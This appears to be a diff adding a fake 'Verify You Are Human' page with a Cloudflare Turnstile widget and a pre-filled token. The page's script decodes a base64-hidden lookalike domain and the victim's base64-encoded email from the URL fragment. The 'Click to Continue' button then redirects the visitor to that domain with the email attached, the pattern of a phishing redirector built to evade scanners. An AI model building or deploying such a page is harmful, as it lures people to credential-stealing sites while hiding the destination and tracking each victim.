@@ -1,0 +1,86 @@
+
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Verify You Are Human</title>
+	<style type="text/css">html, body { height: 100%; }
+    body {
+      margin: 0;
+      background: #ffffff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: flex-start;      /* top spacing like your screenshot */
+      justify-content: center;
+    }
+    .wrap {
+      width: 100%;
+      max-width: 820px;
+      text-align: center;
+      margin-top: 48px;
+    }
+    h1 {
+      margin: 0 0 18px;
+      font-size: 28px;
+      font-weight: 700;
+      color: #111827;
+    }
+    .btn {
+      display: inline-block;
+      margin-top: 14px;
+      padding: 10px 18px;
+      font-size: 14px;
+      background: #1673ea;
+      color: #fff;
+      border: 0;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn:hover { opacity: .95; }
+    .hidden { display: none; }
+
+    /* no card look  matches the screenshot */
+    .container { background: transparent; box-shadow: none; padding: 0; border-radius: 0; }
+	</style>
+	<!-- Cloudflare Turnstile --><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async="" defer=""></script>
+</head>
+<body>
+<div class="wrap">
+<h1>Verify You Are Human</h1>
+
+<div class="container"><!-- Force English UI -->
+<div class="cf-turnstile" data-callback="onTurnstileSuccess" data-language="en" data-sitekey="0x4AAAAAABvARAvrrYIm17Po" data-theme="light">
+<div><input id="cf-chl-widget-thb2r_response" name="cf-turnstile-response" type="hidden" value="0.hUSNvxDUCPPyN-B4Rd9iSCe8EQVRlw3Idpf48DkFpiKyOhz-dgnl3svL7UcNUOO-jl4nRZcRbPw-TQDOGFHBq7a_RlxfA9qvOSDERFuS3FU4ZQRqA9EYcPXcOczwLOBW2sL1Z5rNvT-JnP3qAeSfQ3xtPsa5d4vYXuniLC8bgoc4XSw0VMu9bIsEG6wrzNLUSlPyzUoqnk3cH_6J5MwAI6EhZI9SQOoLE_eYITjAFUZ2EoAa27fBACLx8uCrMNOA7qtodfWumh16XnhppxJHFdNO-Dct-N1Exqarb5kofVrmBG4CDYgzPomdGSGYl5y9ic1mASI58Z_FaAI0qARalfwMby78vKlWNV4Z4e_j1V2EAtYa_vD_1eCCuZrT7Ajg-8THZ6Mu9zmb6SQLOM-WmePcQCk80KX7ya6GaQZRma0Vzg20MZcAdtWB_JfRq5lYpYQNHpZoh63u3VxU880gNys4N5vMzaLNIte_hy4QUHSk0wq0LCXJqTAvUki1XH_atcpwbRvCDuH3sbUpotWEdxPB7OyUN0PuOudSGAkPRO_KGHN5IA0sEW2cotH-Hqu1d-vPQbSFK2uJvSnTIIJkOtpHFRvqm0OBA6WD_LSvhPgBjQFbKwMWh2acdcvUKBE2_VlY_gQQqSrQg61Bcu5ma6F4Lh0wj7B3rras9JGaNkYOHJwnfblL_61GosRupw6yGHSAkvYbreTYNzsJykNblrvKzSdHGMHF572-jE3mQCs5Ol0tfo6WsNuVpVImlhsNEGa411U5LGR4u39NC5T2MnsQWv7uEAcgt0jgTwje8xG3Qd3IxTeRK91uyeDZy1ATcn-zjKZ9DrEmZYMXQT4h77_Jcpc0mQBrgayYzeG1r0ZX2DTKsijDucH5rYnvn24ryKYAA8OZEKb-MKvvTcNtTTvIQ2LYbu5u2axoRgoZINgaM9i7n4Hsq28XoYWUyyTb.BSGolif_MC0zlAFeeehEmQ.6c6926dabd3049d09cd73cdc4fc144725d8a97c6af81980e2c0e65c46478e409" /></div>
+</div>
+<button class="btn" id="redirectBtn">Click to Continue</button></div>
+</div>
+<script>
+    /* same logic as your original */
+    function decodeBase64(str){try{return atob(str);}catch(e){return str;}}
+    function extractEmail(fakePath){
+      let hashPart=window.location.hash.split("#")[1];
+      if(hashPart){
+        hashPart=hashPart.replace("?", "");
+        let parts=hashPart.split("=");
+        if(parts[0]===fakePath) return parts[1];
+      }
+      return null;
+    }
+    function onTurnstileSuccess(){
+      var b=document.getElementById('redirectBtn');
+      if(b){ b.classList.remove('hidden'); }
+    }
+    document.getElementById("redirectBtn").addEventListener("click", function(){
+      const baseUrl=decodeBase64("aHR0cHM6Ly9hcmNobHRlY3R1ci5mci8j");
+      const fakePath="45676587654";
+      const email=extractEmail(fakePath);
+      if(email){
+        const decodedEmail=decodeBase64(email);
+        const finalUrl=baseUrl+decodedEmail;
+        window.location.href=finalUrl;
+      }else{
+        alert("No valid data found in the URL.");
+      }
+    });
+  </script></body>
+</html>
